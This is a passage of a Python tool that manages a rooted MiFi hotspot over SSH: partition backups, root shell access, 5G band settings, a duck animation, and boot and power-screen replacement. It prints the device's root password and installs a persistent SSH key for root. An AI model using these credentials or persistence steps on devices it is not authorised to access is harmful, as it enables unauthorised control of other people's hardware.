            print(f"{GREEN}ok{RESET}")

    if bad:
        fail(f"{bad} partitions failed, re-run the backup")
    else:
        ok(f"all {len(parts)} partitions dumped to {out_dir}/, zero warnings")
        show_device_screen(cli, "operation-done")
    cli.close()
    pause()


def ensure_ssh_key():
    """Install a passwordless RSA key on the device so ssh.exe stops asking
    for Root@123 every time. dropbear here only speaks legacy ssh-rsa
    signatures, which is why the key must be RSA. We use a dedicated mifi_rsa
    pair so we never touch (or clobber) the user's own keys."""
    ssh_dir = Path.home() / ".ssh"
    ssh_dir.mkdir(exist_ok=True)
    key = ssh_dir / "mifi_rsa"
    if not key.exists():
        subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "2048", "-N", "",
                        "-f", str(key), "-q"], check=True)
        ok("generated a new ssh key for this device")
    pub_file = key.with_suffix(".pub")
    if not pub_file.exists():
        # private key exists but public half is gone, derive it
        r = subprocess.run(["ssh-keygen", "-y", "-P", "", "-f", str(key)],
                           capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError("cannot derive public key (is mifi_rsa passphrase protected?)")
        pub_file.write_text(r.stdout.strip() + "\n")
    pub = pub_file.read_text().strip()
    blob = pub.split()[1]
    cli = ssh_connect()
    ssh_exec(cli, "mkdir -p /etc/dropbear && touch /etc/dropbear/authorized_keys")
    _, out, _ = ssh_exec(cli, f"grep -cF '{blob}' /etc/dropbear/authorized_keys")
    if out != "1":
        ssh_exec(cli, f"echo '{pub}' >> /etc/dropbear/authorized_keys && "
                      f"chmod 600 /etc/dropbear/authorized_keys")
        ok("installed your ssh key on the device, no more password prompts")
    cli.close()
    return key


def flow_ssh_shell():
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}SSH shell{RESET}\n")
    info(f"root password: {BOLD}{ROOT_PW}{RESET}")
    print(f"""
  {YELLOW}{BOLD}DO NOT:{RESET}
   * flash/erase {RED}boot, abl, xbl, sbl, tz{RESET} or anything bootloader-ish
     (there is no signed firehose, a bad flash there is an unrecoverable brick)
   * cat binaries to the terminal (binary output can hang the session)
   * restore someone else's /persist dump (TrustZone encrypts the WebUI
     passwords per device, a foreign dump crashes the WebUI)
  {GREEN}DO:{RESET}
   * dd all mtdblocks to your PC before changing anything
   * use 'modem2_cli' (with LD_LIBRARY_PATH=/opt/nvtl/lib) for modem tweaks

  type {BOLD}exit{RESET} to return to the menu
""")
    try:
        key = ensure_ssh_key()
    except Exception as e:
        warn(f"key setup failed ({e}), falling back to password auth")
        key = None
    cmd = ["ssh", "-p", str(SSH_PORT),
           "-o", "HostKeyAlgorithms=+ssh-rsa",
           "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa"]
    if key:
        # no PasswordAuthentication=no: if key auth ever fails, ssh quietly
        # falls back to the password prompt instead of dying
        cmd += ["-i", str(key), "-o", "IdentitiesOnly=yes"]
    cmd.append(f"root@{HOST}")

    def _screen(name):
        # screen pushes are best-effort: a failed connect shouldn't block
        # the shell itself
        try:
            cli = ssh_connect()
            show_device_screen(cli, name)
            cli.close()
        except Exception:
            pass

    _screen("operation-inprogress")
    subprocess.call(cmd)
    _screen("operation-done")


# ------------------------------------------------------------- tweaks -------

MODEM2 = "LD_LIBRARY_PATH=/opt/nvtl/lib /opt/nvtl/bin/modem2_cli"


def modem2_set_nr5g_bands(cli, kind, bands):
    """set_enabled_nr5g_*_bands ignores argv and prompts on stdin: first the
    band count, then one band number per line. It never exits by itself, so we
    feed everything and drop the channel. Each call REPLACES the whole list."""
    chan = cli.get_transport().open_session()
    chan.exec_command(f"{MODEM2} set_enabled_nr5g_{kind}_bands 2>&1")
    time.sleep(1)
    chan.sendall(f"{len(bands)}\n".encode())
    time.sleep(0.5)
    for b in bands:
        chan.sendall(f"{b}\n".encode())
        time.sleep(1.5)
    time.sleep(2)
    out = b""
    while chan.recv_ready():
        out += chan.recv(4096)
        time.sleep(0.1)
    chan.close()
    return out.decode(errors="replace").strip()

DUCK_SH = """#!/bin/sh
# SpinningDuck on the screen, frames in /data/duck
export LD_LIBRARY_PATH="${LD_LIBRARY_PATH}:/opt/nvtl/lib"
DIR=/data/duck
COUNT=36
DELAY=83333

CHILD=""
stop() {
    [ -n "$CHILD" ] && kill "$CHILD" 2>/dev/null
    exit 0
}
trap stop INT TERM

while :; do
    /opt/nvtl/bin/mifi_display_png "$DIR/duck_" "$COUNT" "$DELAY" &
    CHILD=$!
    wait "$CHILD"
done
"""


def duck_installed(cli):
    _, out, _ = ssh_exec(cli, "[ -f /opt/nvtl/bin/duck ] && [ -d /data/duck ] && echo yes")
    return out == "yes"


def duck_running(cli):
    _, out, _ = ssh_exec(cli, "pidof mifi_display_png 2>/dev/null")
    return bool(out)


def duck_start(cli):
    ssh_exec(cli, "nohup /opt/nvtl/bin/duck >/dev/null 2>&1 &")
    ok("duck is spinning on the screen")


def duck_stop(cli):
    ssh_exec(cli, "kill $(ps w | awk '/duck|mifi_display_png/ && !/awk/ {print $1}') 2>/dev/null")
    ok("duck stopped")
    info("tap anywhere on the screen to bring back the device UI")


def duck_install(cli):
    frames = sorted(Path("tools/frames").glob("duck_*.png"),
                    key=lambda p: int(p.stem.split("_")[1]))
    if not frames:
        fail("no frames in tools/frames (run tools/duck.py once, it needs ffmpeg)")
        pause()
        return
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Duck install{RESET}\n")
    show_device_screen(cli, "operation-inprogress")
    ssh_exec(cli, "mkdir -p /data/duck")
    pushed = 0
    for f in frames:
        remote = f"/data/duck/{f.name}"
        _, out, _ = ssh_exec(cli, f"[ -f {remote} ] && echo yes || echo no")
        if out != "yes":
            if push_bytes(cli, remote, f.read_bytes()) != 0:
                fail(f"upload failed: {f.name}")
                pause()
                return
            pushed += 1
    if push_bytes(cli, "/opt/nvtl/bin/duck", DUCK_SH.encode()) != 0:
        fail("failed to write /opt/nvtl/bin/duck")
        pause()
        return
    ssh_exec(cli, "chmod +x /opt/nvtl/bin/duck")
    rc, out, _ = ssh_exec(cli, "LD_LIBRARY_PATH=/opt/nvtl/lib /opt/nvtl/bin/mifi_display_png /data/duck/duck_1 2>&1")
    if rc != 0:
        fail(f"frame test failed: {out}")
        pause()
        return
    ok(f"duck installed ({pushed} frames pushed, frames and script survive reboots)")
    show_device_screen(cli, "operation-done")
    pause()


def flow_duck(cli, installed):
    if not installed:
        duck_install(cli)
        if not duck_installed(cli):
            return
    while True:
        running = duck_running(cli)
        state = (f"{GREEN}duck is spinning on the screen{RESET}" if running
                 else f"{DIM}duck is installed but not running{RESET}")
        opts = (["Stop duck"] if running else ["Start duck"]) + ["Uninstall duck", "Back"]
        sel = menu("Duck", opts, info_lines=[state])
        if sel == -1 or opts[sel] == "Back":
            return
        clear()
        banner()
        print()
        if opts[sel] == "Start duck":
            duck_start(cli)
            pause()
        elif opts[sel] == "Stop duck":
            duck_stop(cli)
            pause()
        elif opts[sel] == "Uninstall duck":
            duck_stop(cli)
            ssh_exec(cli, "rm -f /opt/nvtl/bin/duck; rm -rf /data/duck")
            ok("duck uninstalled")
            pause()
            return


# ------------------------------------------- startup, screens and spinners --

# All of this lives in persistent data (/opt/nvtl/data/branding is NOT
# re-extracted at boot unless a branding.tgz/ipk is present, so edits here
# survive reboots). The boot animation is replayed by
# mifi_display_animation.service; the power/restart/reset screens and the
# loading spinners are static assets read by devuiappd out of deviceui/.
STARTUP_DIR = "/opt/nvtl/data/branding/startup"
IMAGES_DIR = "/opt/nvtl/data/branding/deviceui/images"
STARTUP_LOCAL = Path("startup")
BUNDLED_STARTUP_ZIP = STARTUP_LOCAL / "outblindstop startup.zip"
BUNDLED_SCREENS_DIR = Path.home() / "Downloads" / "outblindstop off screens"
STOCK_DELAY_US = 18000          # stock: 89 frames, 18 ms/frame (~55.6 fps)
ANIM_W, ANIM_H = 320, 240

# Loose-file install aliases: short custom names map onto the stock files
# devuiappd actually reads (MIFIScreen_*) plus the legacy sprint_* copies so
# both sets stay consistent no matter which path the UI takes.
SCREEN_ALIASES = {
    "poweroff.png": ("DeviceImages_DeviceUI_MIFIScreen_OFF.png",
                     "sprint_powering_off.png"),
    "power_off.png": ("DeviceImages_DeviceUI_MIFIScreen_OFF.png",
                      "sprint_powering_off.png"),
    "shutdown.png": ("DeviceImages_DeviceUI_MIFIScreen_OFF.png",
                     "sprint_powering_off.png"),
    "restart.png": ("DeviceImages_DeviceUI_MIFIScreen_Restart.png",
                    "sprint_restarting.png"),
    "reboot.png": ("DeviceImages_DeviceUI_MIFIScreen_Restart.png",
                   "sprint_restarting.png"),
    "reset.png": ("DeviceImages_DeviceUI_MIFIScreen_Reset.png",
                  "sprint_resetting.png"),
}

# Copy of the stock mifi_display_animation.sh with NUM_FILES/USLEEP swapped
# out, so zips without a bundled script still get the exact stock boot-time
# behaviour (frame caching into the page cache + chrt realtime priority).
ANIM_SH = """#!/bin/sh
#
# splash_animation
#

export PATH=$PATH:/opt/nvtl/bin
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/nvtl/lib

BASE_PATH=/opt/nvtl/data/branding/startup/animation_
NUM_FILES=__NUM_FILES__
USLEEP=__USLEEP__

cache_files()
{
    COUNT=1
    while [ $COUNT -lt $NUM_FILES ]; do
        dd if=$BASE_PATH$COUNT.png of=/dev/null bs=32K > /dev/null 2>&1
        let COUNT=COUNT+1
    done
}

case $1 in
    start)
        echo "power on animation cache files started" > /dev/kmsg
        cache_files
        echo "[MIFI_TIMESTAMP] - power on animation started" > /dev/kmsg
        chrt -f 1 /opt/nvtl/bin/mifi_display_png $BASE_PATH $NUM_FILES $USLEEP &
        ;;
    stop)
        echo "stopping splashscreen animation"
        killall -q mifi_display_png
        ;;
esac
"""


def _frame_num(name):
    m = re.search(r"(\d+)", Path(name).stem)
    return int(m.group(1)) if m else 0


def startup_params(cli):
    """(num_frames, delay_us, script_text_or_None) as currently on device."""
    rc, script, _ = ssh_exec(cli, f"cat {STARTUP_DIR}/mifi_display_animation.sh 2>/dev/null")
    num = re.search(r"NUM_FILES=(\d+)", script)
    delay = re.search(r"USLEEP=(\d+)", script)
    n = int(num.group(1)) if num else None
    d = int(delay.group(1)) if delay else STOCK_DELAY_US
    if n is None:
        _, out, _ = ssh_exec(cli, f"ls {STARTUP_DIR}/animation_*.png 2>/dev/null | wc -l")
        try:
            n = int(out)
        except ValueError:
            n = 0
    return n, d, (script if rc == 0 else None)


def _startup_pull(cli, dest_dir):
    """Stream the animation dir off the device into dest_dir. Returns the
    local frame paths (or None on failure). Only plain animation files are
    unpacked, so device symlinks/dev nodes can never trip the extractor."""
    dest_dir.mkdir(parents=True, exist_ok=True)
    _, stdout, _ = cli.exec_command(f"tar czf - {shlex.quote(STARTUP_DIR)}")
    tarball = dest_dir / "_startup.tar.gz"
    with open(tarball, "wb") as f:
        while True:
            chunk = stdout.read(1 << 16)
            if not chunk:
                break
            f.write(chunk)
    if stdout.channel.recv_exit_status() != 0 or tarball.stat().st_size == 0:
        fail(f"tar failed on device - does {STARTUP_DIR} exist?")
        return None
    expected = STARTUP_DIR.strip("/")
    frames = []
    with tarfile.open(tarball, "r:gz") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            rel = m.name[2:] if m.name.startswith("./") else m.name
            if not (rel == expected or rel.startswith(expected + "/")):
                fail(f"unexpected path in tar, refusing to extract: {m.name}")
                return None
            base = rel[len(expected):].lstrip("/")
            if base != "mifi_display_animation.sh" and not \
                    (base.startswith("animation_") and base.endswith(".png")):
                continue
            target = dest_dir / base
            with tf.extractfile(m) as src, open(target, "wb") as out:
                out.write(src.read())
            if base.startswith("animation_"):
                frames.append(target)
    tarball.unlink()
    return frames


def _pack_startup_zip(zip_path, frame_files, script_text, delay_us, origin,
                      extra_files=()):
    """Bundle frames + the player script + a metadata file (frame count and
    per-frame delay) so the zip is self-describing at install time.
    extra_files are (arcname, bytes) pairs for loose deviceui assets
    (power-off screens, spinners) stored under images/ in the zip."""
    zip_path.parent.mkdir(parents=True, exist_ok=True)
    meta = {
        "format": "mifi-startup-animation",
        "num_frames": len(frame_files),
        "delay_us": int(delay_us),
        "resolution": f"{ANIM_W}x{ANIM_H}",
        "created": time.strftime("%Y-%m-%d %H:%M:%S"),
        "origin": origin,
        "images": sorted(a for a, _ in extra_files),
    }
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("metadata.json", json.dumps(meta, indent=2))
        for f in sorted(frame_files, key=lambda p: _frame_num(p.name)):
            # normalise the arcnames to animation_<n>.png (1-indexed) so the
            # stock player script always finds what it expects
            zf.write(f, f"animation_{_frame_num(f.name)}.png")
        zf.writestr("mifi_display_animation.sh", script_text)
        for arcname, data in extra_files:
            zf.writestr(f"images/{arcname}", data)
    return meta


# Static deviceui assets covered by the backup alongside the boot frames.
# Power-off/restart/reset are the ones devuiappd reads (plus legacy
# sprint_* twins); the spinners are devuiappd loading indicators. The whole
# set is ~200 kB so bundling it with every backup costs nothing.
BACKUP_IMAGES = [
    "DeviceImages_DeviceUI_MIFIScreen_OFF.png",
    "DeviceImages_DeviceUI_MIFIScreen_Restart.png",
    "DeviceImages_DeviceUI_MIFIScreen_Reset.png",
    "sprint_powering_off.png",
    "sprint_restarting.png",
    "sprint_resetting.png",
    "activity-spinner.gif",
    "init-activity-spinner.gif",
    "startup-activity-spinner.gif",
    "activity_animation_red.gif",
    "ucf_animation.gif",
]

# Selectable install/restore groups. "screens" also accepts the short
# custom names in SCREEN_ALIASES; spinner matching is substring-based so
# current and future spinner GIFs all land in one group.
IMAGE_GROUPS = [
    ("Power-off screen", "DeviceImages_DeviceUI_MIFIScreen_OFF.png"),
    ("Restart screen", "DeviceImages_DeviceUI_MIFIScreen_Restart.png"),
    ("Reset screen", "DeviceImages_DeviceUI_MIFIScreen_Reset.png"),
    ("Loading spinners", "spinner"),
]


def _group_label_for(arcname):
    base = (arcname.split("/", 1)[1] if "/" in arcname else arcname).lower()
    if "spinner" in base or "ucf_animation" in base:
        return "Loading spinners"
    if "off" in base or "power" in base or "shutdown" in base:
        return "Power-off screen"
    if "restart" in base or "reboot" in base:
        return "Restart screen"
    if "reset" in base:
        return "Reset screen"
    return base


def _cat_bytes(cli, remote):
    """Raw bytes of a device file, or None. push/pull helpers only deal in
    files and trees, and these are single small assets, so cat over the
    exec channel is the cheapest reliable path."""
    _, stdout, _ = cli.exec_command(f"cat {shlex.quote(remote)}")
    data = stdout.read()
    if stdout.channel.recv_exit_status() != 0 or not data:
        return None
    return bytes(data)


def startup_backup(cli):
    """Pull the boot animation plus the power/spinner images off the device
    and pack them into a timestamped zip in startup/."""
    zip_path = STARTUP_LOCAL / f"animation-backup-{time.strftime('%Y%m%d-%H%M%S')}.zip"
    show_device_screen(cli, "operation-inprogress")
    with tempfile.TemporaryDirectory() as tmp:
        tmpdir = Path(tmp)
        frames = _startup_pull(cli, tmpdir)
        if not frames:
            fail(f"no animation frames found in {STARTUP_DIR}")
            return None
        script_file = tmpdir / "mifi_display_animation.sh"
        script_text = (script_file.read_text(errors="replace")
                       if script_file.exists() else ANIM_SH)
        m = re.search(r"USLEEP=(\d+)", script_text)
        delay = int(m.group(1)) if m else STOCK_DELAY_US
        extra = []
        for name in BACKUP_IMAGES:
            data = _cat_bytes(cli, f"{IMAGES_DIR}/{name}")
            if data:
                extra.append((name, data))
            else:
                warn(f"{name} not found on device, skipping")
        meta = _pack_startup_zip(zip_path, frames, script_text, delay,
                                 f"backup of {STARTUP_DIR} + deviceui images on {HOST}",
                                 extra_files=extra)
    show_device_screen(cli, "operation-done")
    ok(f"backed up {meta['num_frames']} frames + {len(meta.get('images', []))} images "
       f"({meta['delay_us'] / 1000:.1f} ms/frame) -> {zip_path}")
    return zip_path


def _prepare_frame_bytes(data):
    """mifi_display_png only accepts 320x240 RGB (colortype 2) PNGs. Clean
    frames pass through untouched, anything else gets fixed up with PIL."""
    if len(data) > 26 and data[:8] == b"\x89PNG\r\n\x1a\n":
        w, h = struct.unpack(">II", data[16:24])
        if (w, h) == (ANIM_W, ANIM_H) and data[25] == 2:
            return data
    try:
        from PIL import Image, ImageOps
    except ImportError:
        raise RuntimeError("frames need converting to 320x240 RGB but PIL is "
                           "missing (pip install pillow)")
    img = Image.open(io.BytesIO(data)).convert("RGB")
    if img.size != (ANIM_W, ANIM_H):
        img = ImageOps.pad(img, (ANIM_W, ANIM_H), color=(0, 0, 0))
    buf = io.BytesIO()
    img.save(buf, "PNG")
    return buf.getvalue()


def _zip_image_names(names):
    return sorted([n for n in names if n.startswith("images/")
                   and not n.endswith("/")],
                  key=lambda n: n.lower())


def _image_targets(data, arcname):
    """(device filename, bytes) pairs for one zip asset. Short custom names
    (poweroff.png, restart.png) fan out to the stock files devuiappd reads
    (MIFIScreen_*) plus the legacy sprint_* twins so both UI paths stay in
    sync. Canonical device names install verbatim - fanning those out too
    would let a zip's sprint_* twin overwrite the MIFIScreen_* file with
    different artwork. GIF spinners install under their own name."""
    base = arcname.split("/", 1)[1] if "/" in arcname else arcname
    low = base.lower()
    if low in SCREEN_ALIASES:
        return [(t, data) for t in SCREEN_ALIASES[low]]
    canonical = {t.lower() for group in SCREEN_ALIASES.values() for t in group}
    if low in canonical:
        return [(base, data)]
    # unrecognised name derived from a canonical one (MIFIScreen_OFF_new.png):
    # map it onto that group's files; anything else installs verbatim
    for group in SCREEN_ALIASES.values():
        stem = group[0].lower().replace("deviceimages_deviceui_", "") \
                           .replace(".png", "")
        if stem in low:
            return [(t, data) for t in group]
    return [(base, data)]


def images_install(cli, zip_path, only=None, confirm=True):
    """Install deviceui images (power screens, spinners) from a backup zip
    or a folder of loose files. only limits to IMAGE_GROUPS labels
    ("Power-off screen", ..., "Loading spinners"); None installs all."""
    zp = Path(zip_path)
    assets = []  # (arcname, bytes)
    if zp.is_dir():
        for f in sorted(zp.iterdir()):
            if f.is_file() and f.suffix.lower() in (".png", ".gif"):
                assets.append((f"images/{f.name}", f.read_bytes()))
    else:
        try:
            zf = zipfile.ZipFile(zp)
        except zipfile.BadZipFile:
            fail(f"{zp} is not a valid zip or folder")
            return False
        with zf:
            for n in _zip_image_names(zf.namelist()):
                assets.append((n, zf.read(n)))
    if not assets:
        fail(f"no power screens or spinners found in {zp}")
        return False
    if only:
        want = set(only)
        assets = [a for a in assets
                  if _group_label_for(a[0]) in want]
        if not assets:
            fail("none of the chosen items are in that bundle")
            return False
    targets = []
    for arcname, data in assets:
        targets.extend(_image_targets(data, arcname))
    # spinner GIFs must stay GIFs; PNG screens get normalised so the
    # framebuffer tool accepts them (stock is 320x240 RGB)
    staged = []
    try:
        for name, data in targets:
            if name.lower().endswith(".gif"):
                staged.append((name, data))
            else:
                staged.append((name, _prepare_frame_bytes(data)))
    except RuntimeError as e:
        fail(str(e))
        return False
    if confirm:
        clear()
        banner()
        print(f"  {BOLD}{MAGENTA}Screens & spinners install{RESET}\n")
        print(f"  bundle:    {zp}")
        for name, _ in staged:
            print(f"    {IMAGES_DIR}/{name}")
        print()
        warn(f"this overwrites those files in {IMAGES_DIR}.")
        if menu("Install these now?", ["Cancel", "Install"]) != 1:
            return False
    cli = ssh_ensure(cli)
    if not cli:
        return False
    show_device_screen(cli, "operation-inprogress")
    for name, data in staged:
        if push_bytes(cli, f"{IMAGES_DIR}/{name}", data) != 0:
            fail(f"push failed for {name}")
            return False
        local_md5 = hashlib.md5(data).hexdigest()
        _, out, _ = ssh_exec(cli, f"md5sum {IMAGES_DIR}/{name}")
        if not out or out.split()[0] != local_md5:
            fail(f"md5 mismatch after push ({name})!")
            return False
    show_device_screen(cli, "operation-done")
    ok(f"installed {len(staged)} screen/spinner file(s)")
    info("screens apply immediately; spinners on next UI load")
    return True


def flow_images_install(cli):
    """Install screens/spinners from a backup zip or the bundled folder,
    with a per-group picker so restores can be selective."""
    STARTUP_LOCAL.mkdir(exist_ok=True)
    opts = []
    if BUNDLED_SCREENS_DIR.exists():
        opts.append(f"Bundled folder ({BUNDLED_SCREENS_DIR.name})")
    zips = [z for z in sorted(STARTUP_LOCAL.glob("*.zip"))]
    opts += [z.name for z in zips] + ["Type a path manually", "Back"]
    sel = menu("Screens & spinners: choose source", opts, info_lines=[
        "backups (animation-backup-*) carry the stock images too",
    ])
    if sel == -1 or opts[sel] == "Back":
        return
    if opts[sel] == "Type a path manually":
        p = prompt("zip or folder path:")
        if not p:
            return
        src = Path(p)
        if not src.exists():
            fail(f"{src} not found")
            return
    elif opts[sel].startswith("Bundled folder"):
        src = BUNDLED_SCREENS_DIR
    else:
        src = zips[sel - (1 if BUNDLED_SCREENS_DIR.exists() else 0)]
    labels = (["Boot animation"] + [label for label, _ in IMAGE_GROUPS]
              + ["Everything"])
    picked = multi_menu("Install which?", labels)
    if not picked:
        return
    if "Everything" in picked:
        picked = ["Boot animation"] + [label for label, _ in IMAGE_GROUPS]
    if src.is_dir():
        # loose folders only ever hold screens/spinners, never boot frames
        if "Boot animation" in picked:
            warn("folders hold screens/spinners only, no boot animation in there")
        only = [p for p in picked if p != "Boot animation"]
        if not only:
            return
        images_install(cli, src, only=only)
    else:
        startup_install(cli, src, parts=picked)


def startup_pick_zip():
    """Pick an animation zip from startup/ (or type any path)."""
    STARTUP_LOCAL.mkdir(exist_ok=True)
    zips = sorted(STARTUP_LOCAL.glob("*.zip"))
    opts = [z.name for z in zips] + ["Type a path manually", "Back"]
    sel = menu("Startup & animations: choose bundle", opts, info_lines= [
        f"{len(zips)} bundle(s) in {STARTUP_LOCAL}/","{DIM}backups (animation-backup-*) and video conversions land there too{RESET}",
    ])
    if sel == -1 or opts[sel] == "Back":
        return None
    if opts[sel] == "Type a path manually":
        p = prompt("zip path:")
        if not p:
            return None
        p = Path(p)
        if not p.exists():
            fail(f"{p} not found")
            return None
        return p
    return zips[sel]


def startup_install(cli, zip_path, confirm=True, parts=None):
    """Install from an animation bundle. Frames are normalised to the
    format mifi_display_png demands, the player script's NUM_FILES and
    USLEEP are forced to match, and the old frames are wiped first so a
    shorter animation can't leave ghost frames behind. parts selects
    bundle sections ({"Boot animation", ...} + IMAGE_GROUPS labels);
    None installs everything. Old frame-only zips are treated as boot
    animation only."""
    zp = Path(zip_path)
    try:
        zf = zipfile.ZipFile(zp)
    except zipfile.BadZipFile:
        fail(f"{zp} is not a valid zip")
        return False
    with zf:
        names = zf.namelist()
        try:
            meta = json.loads(zf.read("metadata.json").decode())
        except (KeyError, ValueError):
            meta = {}
        frame_names = sorted([n for n in names if n.lower().endswith(".png")
                              and not n.startswith("images/")],
                             key=_frame_num)
        image_names = _zip_image_names(names)
        if not frame_names and not image_names:
            fail(f"no frames or images found in {zp}")
            return False
        script_text = None
        if "mifi_display_animation.sh" in names:
            script_text = zf.read("mifi_display_animation.sh").decode(errors="replace")
        # metadata wins for the delay unless the bundled script disagrees
        delay = int(meta.get("delay_us") or STOCK_DELAY_US)
        if script_text:
            m = re.search(r"USLEEP=(\d+)", script_text)
            if m:
                delay = int(m.group(1))
        num = len(frame_names)

    want_boot = True
    image_parts = None
    if parts is not None:
        want_boot = "Boot animation" in parts
        image_parts = [p for p in parts if p != "Boot animation"]
        if want_boot and not frame_names:
            fail(f"{zp} has no boot animation frames")
            return False
        if image_parts and not image_names:
            fail(f"{zp} has no screens/spinners (pre-feature backup?)")
            return False
    elif not frame_names:
        want_boot = False

    if confirm:
        clear()
        banner()
        print(f"  {BOLD}{MAGENTA}Startup & animations install{RESET}\n")
        print(f"  zip:       {zp}")
        if frame_names:
            print(f"  frames:    {num}")
            print(f"  delay:     {delay / 1000:.1f} ms/frame ({1_000_000 / delay:.1f} fps)")
            print(f"  duration:  {num * delay / 1e6:.2f} s")
        if image_names:
            print(f"  images:    {len(image_names)} screen/spinner file(s)")
        print(f"  target:    {STARTUP_DIR}/ + {IMAGES_DIR}/ on the device\n")
        warn(f"this overwrites the animation files in {STARTUP_DIR}.")
        if not list(STARTUP_LOCAL.glob("animation-backup-*.zip")):
            warn("no device backup exists yet - make one first so you can go back")
            if menu("Backup now (animation + screens + spinners)?",
                    ["Yes", "No (risky)"]) == 0 and not startup_backup(cli):
                return False
        if parts is None and frame_names and image_names:
            seen = []
            for n in image_names:
                label = _group_label_for(n)
                if label not in seen:
                    seen.append(label)
            picked = multi_menu("Install which parts?", [
                "Boot animation",
                *seen,
            ])
            if not picked:
                return False
            want_boot = "Boot animation" in picked
            image_parts = [p for p in picked if p != "Boot animation"]
            if not want_boot and not image_parts:
                return False
        elif menu("Install this bundle?", ["Cancel", "Install"]) != 1:
            return False

    cli = ssh_ensure(cli)
    if not cli:
        return False
    booted = False
    if want_boot and frame_names:
        show_device_screen(cli, "operation-inprogress")
        with tempfile.TemporaryDirectory() as tmp:
            stage = Path(tmp) / "startup"
            stage.mkdir()
            try:
                with zipfile.ZipFile(zp) as zf:
                    for i, name in enumerate(frame_names, 1):
                        (stage / f"animation_{i}.png").write_bytes(
                            _prepare_frame_bytes(zf.read(name)))
            except RuntimeError as e:
                fail(str(e))
                return False
            if script_text is None:
                script_text = ANIM_SH
            script_text = re.sub(r"NUM_FILES=\d+", f"NUM_FILES={num}", script_text)
            script_text = re.sub(r"USLEEP=\d+", f"USLEEP={delay}", script_text)
            if "__NUM_FILES__" in script_text:
                # zip shipped an unbaked template - regenerate it rather than
                # install a script the device shell can't run
                script_text = (ANIM_SH.replace("__NUM_FILES__", str(num))
                                      .replace("__USLEEP__", str(delay)))
            # write BYTES with forced LF: text-mode write_text would translate
            # to CRLF on Windows and busybox ash chokes on the \r characters
            script_text = script_text.replace("\r\n", "\n").replace("\r", "\n")
            (stage / "mifi_display_animation.sh").write_bytes(script_text.encode())
            ssh_exec(cli, f"rm -f {STARTUP_DIR}/animation_*.png")
            if not push_to_device(cli, stage, STARTUP_DIR):
                return False
            # trust nothing: verify frame 1 landed byte-for-byte
            local_md5 = hashlib.md5((stage / "animation_1.png").read_bytes()).hexdigest()
            _, out, _ = ssh_exec(cli, f"md5sum {STARTUP_DIR}/animation_1.png")
            if not out or out.split()[0] != local_md5:
                fail("md5 mismatch after push!")
                return False
        ssh_exec(cli, f"chmod +x {STARTUP_DIR}/mifi_display_animation.sh")
        ok(f"installed: {num} frames, {delay / 1000:.1f} ms/frame")
        show_device_screen(cli, "operation-done")
        booted = True
    if image_names and (image_parts or (parts is None and not confirm)):
        with zipfile.ZipFile(zp) as zf:
            raw = [(n, zf.read(n)) for n in image_names]
        if image_parts is not None:
            raw = [(n, d) for n, d in raw if _group_label_for(n) in image_parts]
        if raw:
            targets = []
            for n, d in raw:
                targets.extend(_image_targets(d, n))
            staged = []
            try:
                for name, data in targets:
                    staged.append((name, data if name.lower().endswith(".gif")
                                   else _prepare_frame_bytes(data)))
            except RuntimeError as e:
                fail(str(e))
                return False
            cli = ssh_ensure(cli)
            if not cli:
                return False
            show_device_screen(cli, "operation-inprogress")
            for name, data in staged:
                if push_bytes(cli, f"{IMAGES_DIR}/{name}", data) != 0:
                    fail(f"push failed for {name}")
                    return False
                local_md5 = hashlib.md5(data).hexdigest()
                _, out, _ = ssh_exec(cli, f"md5sum {IMAGES_DIR}/{name}")
                if not out or out.split()[0] != local_md5:
                    fail(f"md5 mismatch after push ({name})!")
                    return False
            show_device_screen(cli, "operation-done")
            ok(f"installed {len(staged)} screen/spinner file(s)")
    if booted:
        if confirm and menu("Preview it on the device now?", ["Yes", "No"]) == 0:
            startup_preview(cli, num, delay)
        info("the new animation plays at the next boot")
    else:
        info("screens apply immediately; spinners on next UI load")
    return True


def flow_root_startup_offer(cli):
    """Rooting extra: backup stock branding and install the bundled
    outblindstop boot animation + off screens. Returns the (possibly
    reconnected) cli, or None."""
    if not BUNDLED_STARTUP_ZIP.exists() and not BUNDLED_SCREENS_DIR.exists():
        return cli
    num, delay, _ = startup_params(cli)
    lines = [f"device now: {num} frames, {delay / 1000:.1f} ms/frame"]
    if BUNDLED_STARTUP_ZIP.exists():
        lines.append(f"boot: {BUNDLED_STARTUP_ZIP.name} in {STARTUP_LOCAL}/")
    if BUNDLED_SCREENS_DIR.exists():
        lines.append(f"screens: {BUNDLED_SCREENS_DIR.name}/ "
                     f"({', '.join(sorted(p.name for p in BUNDLED_SCREENS_DIR.iterdir() if p.is_file()))})")
    lines.append("stock is backed up first so you can revert")
    sel = menu("Install the outblindstop boot look?",
               ["Yes (backup stock + install)", "No (keep stock)"],
               info_lines=lines)
    if sel != 0:
        return cli
    cli = ssh_ensure(cli)
    if not cli:
        return None
    if not list(STARTUP_LOCAL.glob("animation-backup-*.zip")):
        info("backing up stock first...")
        if not startup_backup(cli):
            warn("backup failed, skipping the install")
            return cli
    else:
        info("a stock backup already exists, skipping re-backup")
    cli = ssh_ensure(cli)
    if not cli:
        return None
    if BUNDLED_STARTUP_ZIP.exists() and startup_install(
            cli, BUNDLED_STARTUP_ZIP, confirm=False):
        ok("outblindstop boot animation installed, plays at the next boot")
    if BUNDLED_SCREENS_DIR.exists():
        cli = ssh_ensure(cli)
        if cli and images_install(cli, BUNDLED_SCREENS_DIR, confirm=False):
            ok("outblindstop power screens installed")
    info("to revert or change anything later: Tweaks > Startup & animations >")
    info("Install bundle from zip > pick an animation-backup-*.zip")
    return cli


def startup_preview(cli, num=None, delay=None):
    """Replay the boot animation on the device right now using the exact
    same code path the boot service uses (sh script start)."""
    if not num:
        num, delay, _ = startup_params(cli)
    ssh_exec(cli, "killall -q mifi_display_png")
    rc, out, err = ssh_exec(
        cli, f"sh {STARTUP_DIR}/mifi_display_animation.sh start", timeout=60)
    if rc != 0:
        fail(f"preview failed: {out or err}")
        return
    ok("playing the boot animation on the device now")
    info("(the device UI redraws over it when it finishes)")


def video_to_startup_animation(video_path):
    """ffmpeg a video into 320x240 RGB PNG frames at the stock animation
    frame rate and pack an installable zip. The player shows each frame for
